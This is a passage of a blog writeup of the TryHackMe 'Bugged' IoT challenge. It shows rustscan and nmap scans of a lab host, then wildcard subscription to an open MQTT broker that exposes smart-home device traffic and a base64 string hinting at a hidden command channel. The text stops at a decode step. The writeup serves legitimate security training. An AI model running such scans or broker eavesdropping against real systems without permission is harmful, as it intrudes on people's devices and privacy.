<!DOCTYPE html><html lang="en-gb"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Bugged Tryhackme CTF Writeup - Offens!ve Blogs - Sakibul Ali Khan</title><meta name="description" content="John¬†was working on his smart home appliances when he noticed weird traffic going across the network. Can you help him figure out what these weird&hellip;"><meta name="generator" content="Publii Open-Source CMS for Static Site"><link rel="stylesheet" href="https://sakibulalikhan.pages.dev/media/plugins/syntaxHighlighter/prism-black.css"><link rel="canonical" href="https://sakibulalikhan.pages.dev/bugged-tryhackme-ctf-writeup.html"><link rel="alternate" type="application/atom+xml" href="https://sakibulalikhan.pages.dev/feed.xml"><link rel="alternate" type="application/json" href="https://sakibulalikhan.pages.dev/feed.json"><meta property="og:title" content="Bugged Tryhackme CTF Writeup"><meta property="og:image" content="https://sakibulalikhan.pages.dev/media/posts/5/Bugged-Tryhackme-CTF-Writeup.jpg"><meta property="og:image:width" content="474"><meta property="og:image:height" content="266"><meta property="og:site_name" content="Offens!ve Blogs - Sakibul Ali Khan"><meta property="og:description" content="John¬†was working on his smart home appliances when he noticed weird traffic going across the network. Can you help him figure out what these weird&hellip;"><meta property="og:url" content="https://sakibulalikhan.pages.dev/bugged-tryhackme-ctf-writeup.html"><meta property="og:type" content="article"><meta name="twitter:card" content="summary"><meta name="twitter:site" content="@sakibulalikhan"><meta name="twitter:title" content="Bugged Tryhackme CTF Writeup"><meta name="twitter:description" content="John¬†was working on his smart home appliances when he noticed weird traffic going across the network. Can you help him figure out what these weird&hellip;"><meta name="twitter:image" content="https://sakibulalikhan.pages.dev/media/posts/5/Bugged-Tryhackme-CTF-Writeup.jpg"><link rel="shortcut icon" href="https://sakibulalikhan.pages.dev/media/website/pen-tux.png" type="image/png"><link rel="preload" href="https://sakibulalikhan.pages.dev/assets/dynamic/fonts/jetbrainsmono/jetbrainsmono.woff2" as="font" type="font/woff2" crossorigin><link rel="stylesheet" href="https://sakibulalikhan.pages.dev/assets/css/style.css?v=1909aa20e277be92c34e45175f6bad83"><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://sakibulalikhan.pages.dev/bugged-tryhackme-ctf-writeup.html"},"headline":"Bugged Tryhackme CTF Writeup","datePublished":"2024-01-07T10:40","dateModified":"2024-01-07T10:40","image":{"@type":"ImageObject","url":"https://sakibulalikhan.pages.dev/media/posts/5/Bugged-Tryhackme-CTF-Writeup.jpg","height":266,"width":474},"description":"John¬†was working on his smart home appliances when he noticed weird traffic going across the network. Can you help him figure out what these weird&hellip;","author":{"@type":"Person","name":"Sakibul Ali Khan","url":"https://sakibulalikhan.pages.dev/authors/sakibul-ali-khan/"},"publisher":{"@type":"Organization","name":"Sakibul Ali Khan","logo":{"@type":"ImageObject","url":"https://sakibulalikhan.pages.dev/media/website/pen-tux-2.png","height":500,"width":500}}}</script><noscript><style>img[loading] {
                    opacity: 1;
                }</style></noscript><script type="text/javascript">(function(c,l,a,r,i,t,y){
        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
    })(window, document, "clarity", "script", "kza4v42pst");</script></head><body><div class="container container--center"><script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="sakibulalikhan" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF813F" data-position="Right" data-x_margin="18" data-y_margin="18"></script><script defer="defer" src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon='{"token": "22757d4facf2459dbb19685ef5c4bae1"}'></script><script src="https://mpeztrack.com/v1.0.0/eztrack.min.js" type="text/javascript"></script><script>mpEZTrack.init("3799246d338f6a319e081a697ab7eca4");</script><header class="header"><div class="header__logo"><a class="logo" href="https://sakibulalikhan.pages.dev/"><img src="https://sakibulalikhan.pages.dev/media/website/pen-tux-2.png" alt="Offens!ve Blogs - Sakibul Ali Khan" width="500" height="500"></a></div><nav class="navbar js-navbar"><button class="navbar__toggle js-toggle" aria-label="Menu" aria-haspopup="true" aria-expanded="false"><span class="navbar__toggle-box"><span class="navbar__toggle-inner">Menu</span></span></button><ul class="navbar__menu"><li><a href="https://sakibulalikhan.pages.dev/" target="_self">Home</a></li><li><a href="https://sakibulalikhan.pages.dev/tags/ctf-writeups/" target="_self">CTF Writeups</a></li><li><a href="https://sakibulalikhan.pages.dev/about.html" target="_self">About</a></li><li><a href="https://sakibulalikhan.pages.dev/contact.html" target="_self">Contact</a></li></ul></nav></header><main class="content"><article class="post"><header><h1 class="post__title">Bugged Tryhackme CTF Writeup</h1><div class="post__meta"><time datetime="2024-01-07T10:40" class="post__date">Jan 7, 2024 </time><span class="post__author"><a href="https://sakibulalikhan.pages.dev/authors/sakibul-ali-khan/" class="feed__author">Sakibul Ali Khan</a></span></div><div class="post__tags"><a href="https://sakibulalikhan.pages.dev/tags/ctf-writeups/" class="invert">CTF Writeups</a> <a href="https://sakibulalikhan.pages.dev/tags/iot/" class="invert">IoT</a> <a href="https://sakibulalikhan.pages.dev/tags/iot-security/" class="invert">IoT Security</a> <a href="https://sakibulalikhan.pages.dev/tags/pentesting/" class="invert">Pentesting</a> <a href="https://sakibulalikhan.pages.dev/tags/tryhackme/" class="invert">TryHackMe</a></div></header><figure class="post__image post__cover"><img src="https://sakibulalikhan.pages.dev/media/posts/5/Bugged-Tryhackme-CTF-Writeup.jpg" srcset="https://sakibulalikhan.pages.dev/media/posts/5/responsive/Bugged-Tryhackme-CTF-Writeup-xs.jpg 300w, https://sakibulalikhan.pages.dev/media/posts/5/responsive/Bugged-Tryhackme-CTF-Writeup-sm.jpg 480w, https://sakibulalikhan.pages.dev/media/posts/5/responsive/Bugged-Tryhackme-CTF-Writeup-md.jpg 768w, https://sakibulalikhan.pages.dev/media/posts/5/responsive/Bugged-Tryhackme-CTF-Writeup-lg.jpg 1024w" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" loading="eager" height="266" width="474" alt="Bugged Tryhackme CTF Writeup"></figure><div class="post__entry"><div class="post__entry"><p id="ee57" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">John</strong>¬†was working on his smart home appliances when he noticed weird traffic going across the network. Can you help him figure out what these weird network communications are?</p><p id="a92b" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj"><strong>Difficulty =</strong>¬†Easy</p><p id="c5ce" class="pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Challenges:</strong><span class="ly kz">¬†Network Analyze, IoT Hacking.</span></p><p id="f868" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Beginning start with Rustscan. For scan, we use ‚Äò-a‚Äô flag to specify our target. And we also use ‚Äò-r‚Äô flag to set port ranges.</p><pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="dc46" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">sak@kali~ rustscan -a <span class="hljs-number">10.10</span>.<span class="hljs-number">232.80</span> -r <span class="hljs-number">1</span>-<span class="hljs-number">5000</span><br>.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.<br>| {}  }| { } |{ {_<span class="hljs-number">_</span> {<span class="hljs-number">_</span>   <span class="hljs-number">_</span>}{ {_<span class="hljs-number">_</span>  /  __<span class="hljs-number">_</span>} / {} \ |  <span class="hljs-string">`| |<br>| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |<br>`</span>-<span class="hljs-string">' `-'</span><span class="hljs-string">`-----'`</span>----<span class="hljs-string">'  `-'</span>  <span class="hljs-string">`----'  `</span>---<span class="hljs-string">' `-'</span>  <span class="hljs-string">`-'`</span>-<span class="hljs-string">' `-'</span><br>The Modern Day Port Scanner.<br>_______________________________________<span class="hljs-number">_</span><br>: https:<span class="hljs-regexp">//gi</span>thub.com/RustScan/RustScan :<br> --------------------------------------<br>üåçHACK THE PLANETüåç<br><br>[~] The config file is expected to be at <span class="hljs-string">"/home/sak/.rustscan.toml"</span><br>[~] File limit higher than batch size. Can increase speed by increasing batch size <span class="hljs-string">'-b 1073741716'</span>.<br>Open <span class="hljs-number">10.10</span>.<span class="hljs-number">232.80</span>:<span class="hljs-number">1883</span><br>[~] Starting Script(s)<br>[&gt;] Script to be run Some(<span class="hljs-string">"nmap -vvv -p {{port}} {{ip}}"</span>)<br><br>[~] Starting Nmap <span class="hljs-number">7.93</span> ( https:<span class="hljs-regexp">//nmap</span>.org ) at <span class="hljs-number">2023</span>-<span class="hljs-number">03</span>-<span class="hljs-number">05</span> <span class="hljs-number">12</span>:<span class="hljs-number">52</span> +<span class="hljs-number">06</span><br>Initiating Ping Scan at <span class="hljs-number">12</span>:<span class="hljs-number">52</span><br>Scanning <span class="hljs-number">10.10</span>.<span class="hljs-number">232.80</span> [<span class="hljs-number">2</span> ports]<br>Completed Ping Scan at <span class="hljs-number">12</span>:<span class="hljs-number">52</span>, <span class="hljs-number">0</span>.<span class="hljs-number">24</span>s elapsed (<span class="hljs-number">1</span> total hosts)<br>Initiating Parallel DNS resolution of <span class="hljs-number">1</span> host. at <span class="hljs-number">12</span>:<span class="hljs-number">52</span><br>Completed Parallel DNS resolution of <span class="hljs-number">1</span> host. at <span class="hljs-number">12</span>:<span class="hljs-number">52</span>, <span class="hljs-number">0</span>.<span class="hljs-number">30</span>s elapsed<br>DNS resolution of <span class="hljs-number">1</span> IPs took <span class="hljs-number">0</span>.<span class="hljs-number">30</span>s. Mode: Async [<span class="hljs-comment">#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]</span><br>Initiating Connect Scan at <span class="hljs-number">12</span>:<span class="hljs-number">52</span><br>Scanning <span class="hljs-number">10.10</span>.<span class="hljs-number">232.80</span> [<span class="hljs-number">1</span> port]<br>Discovered <span class="hljs-keyword">open</span> port <span class="hljs-number">1883</span>/tcp on <span class="hljs-number">10.10</span>.<span class="hljs-number">232.80</span><br>Completed Connect Scan at <span class="hljs-number">12</span>:<span class="hljs-number">52</span>, <span class="hljs-number">0</span>.<span class="hljs-number">25</span>s elapsed (<span class="hljs-number">1</span> total ports)<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">232.80</span><br>Host is up, received conn-refused (<span class="hljs-number">0</span>.<span class="hljs-number">25</span>s latency).<br>Scanned at <span class="hljs-number">2023</span>-<span class="hljs-number">03</span>-<span class="hljs-number">05</span> <span class="hljs-number">12</span>:<span class="hljs-number">52</span>:<span class="hljs-number">49</span> +<span class="hljs-number">06</span> <span class="hljs-keyword">for</span> <span class="hljs-number">1</span>s<br><br>PORT     STATE SERVICE REASON<br><span class="hljs-number">1883</span>/tcp <span class="hljs-keyword">open</span>  mqtt    syn-ack</span></pre><p id="d3fd" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">It looks like there is 1 a service running. In target machine service ‚ÄòMQTT‚Äô is running on TCP port ‚Äò1883‚Äô.</p><h2 id="2f82" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj">Basic Information About ‚ÄòMQTT‚Äô</h2><p id="dc0e" class="pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj" data-selectable-paragraph="">MQTT stands for MQ Telemetry Transport. It is a publish/subscribe,¬†<strong class="ly kz">extremely simple, and lightweight messaging protocol</strong>, designed for constrained devices and low-bandwidth, high-latency, or unreliable networks. The design principles are to minimize network bandwidth and device resource requirements whilst also attempting to ensure reliability and some degree of assurance of delivery. These principles also turn out to make the protocol ideal for the emerging ‚Äúmachine-to-machine‚Äù (M2M) or ‚ÄúInternet of Things‚Äù world of connected devices, and for mobile applications where bandwidth and battery power are at a premium.</p><p id="253d" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Default port:</strong>¬†1883</p><figure class="yq yr ys yt yu yv kl km paragraph-image"><div class="kl km aoc"><figure class="bg yx yy c"><figure class="is-loaded"><img src="https://miro.medium.com/v2/resize:fit:663/0*_zH7lb_3H1yrrcAU.png" alt="Bugged Tryhackme CTF Writeup" width="663" height="534" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure></div><figcaption class="yz za zb kl km zc zd be b bf z dl" data-selectable-paragraph="">Basic Information About ‚ÄòMQTT‚Äô</figcaption></figure><p id="51f5" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now our second step began here. At this moment we start the Nmap scan to know more about the service that is running on the server.</p><p id="3d37" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">For Nmap scan, we use ‚Äò-sV‚Äô flag to know about services &amp; versions. And we use ‚Äò-sC‚Äô flag to default script scan. We also use ‚Äò-p‚Äô flag to specify which port we want to scan.</p><pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="ecef" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph=""> sak@kali~ sudo nmap -sV -sC -p 1883 10.10.232.80<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-05 13:08 +06<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.232.80<br>Host is up (0.25s latency).<br><br>PORT     STATE SERVICE                  VERSION<br>1883/tcp open  mosquitto version 2.0.14<br>| mqtt-subscribe: <br>|   Topics and their most recent payloads: <br>|     <span class="hljs-variable">$SYS</span>/broker/load/bytes/received/1min: 4410.65<br>|     <span class="hljs-variable">$SYS</span>/broker/load/publish/sent/5min: 4.71<br>|     <span class="hljs-variable">$SYS</span>/broker/load/messages/sent/15min: 85.18<br>|     <span class="hljs-variable">$SYS</span>/broker/clients/connected: 2<br>|     <span class="hljs-variable">$SYS</span>/broker/load/connections/5min: 0.39<br>|     livingroom/speaker: {<span class="hljs-string">"id"</span>:15127941740320722645,<span class="hljs-string">"gain"</span>:46}<br>|     <span class="hljs-variable">$SYS</span>/broker/messages/sent: 3575<br>|     <span class="hljs-variable">$SYS</span>/broker/load/sockets/15min: 0.22<br>|     <span class="hljs-variable">$SYS</span>/broker/store/messages/count: 34<br>|     <span class="hljs-variable">$SYS</span>/broker/messages/stored: 34<br>|     <span class="hljs-variable">$SYS</span>/broker/publish/messages/sent: 52<br>|     <span class="hljs-variable">$SYS</span>/broker/clients/active: 2<br>|     <span class="hljs-variable">$SYS</span>/broker/subscriptions/count: 3<br>|     <span class="hljs-variable">$SYS</span>/broker/store/messages/bytes: 369<br>|     <span class="hljs-variable">$SYS</span>/broker/publish/bytes/received: 119484<br>|     storage/thermostat: {<span class="hljs-string">"id"</span>:14536458125521088285,<span class="hljs-string">"temperature"</span>:23.189959}<br>|     patio/lights: {<span class="hljs-string">"id"</span>:8415478818146317759,<span class="hljs-string">"color"</span>:<span class="hljs-string">"WHITE"</span>,<span class="hljs-string">"status"</span>:<span class="hljs-string">"OFF"</span>}<br>|     kitchen/toaster: {<span class="hljs-string">"id"</span>:9223877754878364611,<span class="hljs-string">"in_use"</span>:<span class="hljs-literal">true</span>,<span class="hljs-string">"temperature"</span>:156.5998,<span class="hljs-string">"toast_time"</span>:210}<br>|     <span class="hljs-variable">$SYS</span>/broker/version: mosquitto version 2.0.14<br>|     <span class="hljs-variable">$SYS</span>/broker/bytes/received: 167321<br>|     frontdeck/camera: {<span class="hljs-string">"id"</span>:5624806846270235642,<span class="hljs-string">"yaxis"</span>:143.5409,<span class="hljs-string">"xaxis"</span>:-37.70204,<span class="hljs-string">"zoom"</span>:4.5788803,<span class="hljs-string">"movement"</span>:<span class="hljs-literal">false</span>}<br>|     <span class="hljs-variable">$SYS</span>/broker/clients/maximum: 2<br>|     <span class="hljs-variable">$SYS</span>/broker/messages/received: 3524<br>|     <span class="hljs-variable">$SYS</span>/broker/load/bytes/received/15min: 3970.90<br>|     <span class="hljs-variable">$SYS</span>/broker/retained messages/count: 36<br>|     <span class="hljs-variable">$SYS</span>/broker/load/bytes/received/5min: 4291.50<br>|     <span class="hljs-variable">$SYS</span>/broker/publish/bytes/sent: 291<br>|     <span class="hljs-variable">$SYS</span>/broker/load/publish/sent/1min: 21.93<br>|     <span class="hljs-variable">$SYS</span>/broker/load/sockets/1min: 1.83<br>|     <span class="hljs-variable">$SYS</span>/broker/load/connections/15min: 0.14<br>|     <span class="hljs-variable">$SYS</span>/broker/load/connections/1min: 1.83<br>|     <span class="hljs-variable">$SYS</span>/broker/uptime: 2343 seconds<br>|     <span class="hljs-variable">$SYS</span>/broker/load/sockets/5min: 0.42<br>|     <span class="hljs-variable">$SYS</span>/broker/load/messages/sent/5min: 95.12<br>|     <span class="hljs-variable">$SYS</span>/broker/load/messages/sent/1min: 113.75<br>|     <span class="hljs-variable">$SYS</span>/broker/load/messages/received/5min: 90.41<br>|     <span class="hljs-variable">$SYS</span>/broker/load/messages/received/1min: 91.82<br>|     <span class="hljs-variable">$SYS</span>/broker/load/publish/sent/15min: 1.59<br>|     <span class="hljs-variable">$SYS</span>/broker/load/messages/received/15min: 83.59<br>|     <span class="hljs-variable">$SYS</span>/broker/load/bytes/sent/5min: 552.51<br>|     <span class="hljs-variable">$SYS</span>/broker/load/bytes/sent/15min: 398.79<br>|     <span class="hljs-variable">$SYS</span>/broker/load/bytes/sent/1min: 1255.39<br>|     <span class="hljs-variable">$SYS</span>/broker/clients/total: 2<br>|_    <span class="hljs-variable">$SYS</span>/broker/bytes/sent: 16314<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 14.10 seconds</span></pre><p id="8551" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">For ferther scan we use ‚Äòmosquitto‚Äô tool. If your device does have not this tool you can install it by this simple command.</p><pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="d4fc" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">sudo apt-<span class="hljs-keyword">get</span> install mosquitto mosquitto-clients -y</span></pre><p id="a423" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we use ‚Äúmosquitto_sub‚Äù and use ‚Äò-t‚Äô flag to specifying the topic and also use ‚Äò-h‚Äô flag to specify the host address. If we give any topic in in ‚Äò-t‚Äô flag then we‚Äôll get information about that topic. But here we want information about all topics. So, on ‚Äò-t‚Äô flag we use the wildcard ‚Äú#‚Äù for this operation.</p><pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="7f11" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">sak<span class="hljs-variable">@kali</span>~ mosquitto_sub -t <span class="hljs-string">"#"</span> -h <span class="hljs-number">10.10</span>.<span class="hljs-number">232.80</span><br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">6303134845423256684</span>,<span class="hljs-string">"gain"</span><span class="hljs-symbol">:</span><span class="hljs-number">45</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">7062282878224178102</span>,<span class="hljs-string">"color"</span><span class="hljs-symbol">:<span class="hljs-string">"GREEN"</span></span>,<span class="hljs-string">"status"</span><span class="hljs-symbol">:<span class="hljs-string">"ON"</span></span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">5297822194260674402</span>,<span class="hljs-string">"temperature"</span><span class="hljs-symbol">:</span><span class="hljs-number">24.360235</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">2860013371319219134</span>,<span class="hljs-string">"temperature"</span><span class="hljs-symbol">:</span><span class="hljs-number">24.233936</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">5845551519049790310</span>,<span class="hljs-string">"gain"</span><span class="hljs-symbol">:</span><span class="hljs-number">61</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">14786151255640681934</span>,<span class="hljs-string">"color"</span><span class="hljs-symbol">:<span class="hljs-string">"RED"</span></span>,<span class="hljs-string">"status"</span><span class="hljs-symbol">:<span class="hljs-string">"OFF"</span></span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">11637714936854629483</span>,<span class="hljs-string">"in_use"</span><span class="hljs-symbol">:false</span>,<span class="hljs-string">"temperature"</span><span class="hljs-symbol">:</span><span class="hljs-number">158.6413</span>,<span class="hljs-string">"toast_time"</span><span class="hljs-symbol">:</span><span class="hljs-number">207</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">12972826565605654962</span>,<span class="hljs-string">"temperature"</span><span class="hljs-symbol">:</span><span class="hljs-number">23.58</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">5464270745344776246</span>,<span class="hljs-string">"yaxis"</span><span class="hljs-symbol">:</span><span class="hljs-number">88.01166</span>,<span class="hljs-string">"xaxis"</span><span class="hljs-symbol">:-</span><span class="hljs-number">120.650795</span>,<span class="hljs-string">"zoom"</span><span class="hljs-symbol">:</span><span class="hljs-number">3.0464551</span>,<span class="hljs-string">"movement"</span><span class="hljs-symbol">:false</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">3711207335622492878</span>,<span class="hljs-string">"gain"</span><span class="hljs-symbol">:</span><span class="hljs-number">55</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">7536635942787451007</span>,<span class="hljs-string">"color"</span><span class="hljs-symbol">:<span class="hljs-string">"GREEN"</span></span>,<span class="hljs-string">"status"</span><span class="hljs-symbol">:<span class="hljs-string">"OFF"</span></span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">14890795244202004796</span>,<span class="hljs-string">"temperature"</span><span class="hljs-symbol">:</span><span class="hljs-number">23.076757</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">2458810731003226774</span>,<span class="hljs-string">"in_use"</span><span class="hljs-symbol">:true</span>,<span class="hljs-string">"temperature"</span><span class="hljs-symbol">:</span><span class="hljs-number">144.60513</span>,<span class="hljs-string">"toast_time"</span><span class="hljs-symbol">:</span><span class="hljs-number">251</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">9928724913760140067</span>,<span class="hljs-string">"gain"</span><span class="hljs-symbol">:</span><span class="hljs-number">73</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">6498368860634934991</span>,<span class="hljs-string">"temperature"</span><span class="hljs-symbol">:</span><span class="hljs-number">24.349384</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">3598942894745952976</span>,<span class="hljs-string">"color"</span><span class="hljs-symbol">:<span class="hljs-string">"RED"</span></span>,<span class="hljs-string">"status"</span><span class="hljs-symbol">:<span class="hljs-string">"ON"</span></span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">12888160293013420529</span>,<span class="hljs-string">"yaxis"</span><span class="hljs-symbol">:</span><span class="hljs-number">124.13611</span>,<span class="hljs-string">"xaxis"</span><span class="hljs-symbol">:</span><span class="hljs-number">175.50891</span>,<span class="hljs-string">"zoom"</span><span class="hljs-symbol">:</span><span class="hljs-number">0.9612895</span>,<span class="hljs-string">"movement"</span><span class="hljs-symbol">:true</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">7852150045648343267</span>,<span class="hljs-string">"in_use"</span><span class="hljs-symbol">:false</span>,<span class="hljs-string">"temperature"</span><span class="hljs-symbol">:</span><span class="hljs-number">153.8073</span>,<span class="hljs-string">"toast_time"</span><span class="hljs-symbol">:</span><span class="hljs-number">121</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">17285335294252743187</span>,<span class="hljs-string">"gain"</span><span class="hljs-symbol">:</span><span class="hljs-number">54</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">11505589973457021977</span>,<span class="hljs-string">"temperature"</span><span class="hljs-symbol">:</span><span class="hljs-number">23.719482</span>}<br>eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">16076301308523402932</span>,<span class="hljs-string">"color"</span><span class="hljs-symbol">:<span class="hljs-string">"RED"</span></span>,<span class="hljs-string">"status"</span><span class="hljs-symbol">:<span class="hljs-string">"ON"</span></span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">7411803660708968315</span>,<span class="hljs-string">"gain"</span><span class="hljs-symbol">:</span><span class="hljs-number">60</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">18348470723758418035</span>,<span class="hljs-string">"temperature"</span><span class="hljs-symbol">:</span><span class="hljs-number">23.625862</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">12464564460746554731</span>,<span class="hljs-string">"in_use"</span><span class="hljs-symbol">:true</span>,<span class="hljs-string">"temperature"</span><span class="hljs-symbol">:</span><span class="hljs-number">150.03351</span>,<span class="hljs-string">"toast_time"</span><span class="hljs-symbol">:</span><span class="hljs-number">297</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">652803559971738546</span>,<span class="hljs-string">"color"</span><span class="hljs-symbol">:<span class="hljs-string">"GREEN"</span></span>,<span class="hljs-string">"status"</span><span class="hljs-symbol">:<span class="hljs-string">"ON"</span></span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">6540437519393488331</span>,<span class="hljs-string">"temperature"</span><span class="hljs-symbol">:</span><span class="hljs-number">23.25789</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">5951090730247747994</span>,<span class="hljs-string">"yaxis"</span><span class="hljs-symbol">:</span><span class="hljs-number">76.82907</span>,<span class="hljs-string">"xaxis"</span><span class="hljs-symbol">:-</span><span class="hljs-number">96.71407</span>,<span class="hljs-string">"zoom"</span><span class="hljs-symbol">:</span><span class="hljs-number">1.7843343</span>,<span class="hljs-string">"movement"</span><span class="hljs-symbol">:false</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">12233324324560130586</span>,<span class="hljs-string">"gain"</span><span class="hljs-symbol">:</span><span class="hljs-number">49</span>}</span></pre><p id="80a3" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">In this operation we got something interesting thing:</p><pre id="4662" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj">‚ÄúeyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==‚Äù</pre><p id="66fc" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph="">They asked us, ‚ÄúCan you help him figure out what these weird network communications are?‚Äù Yes, got something weird on network communications.</p><p id="fedf" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">This is base64 encoded. So, let‚Äôs decode this and see what we got.</p><pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="74ce" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph=""> sak@kali ~ <span class="hljs-built_in">echo</span> 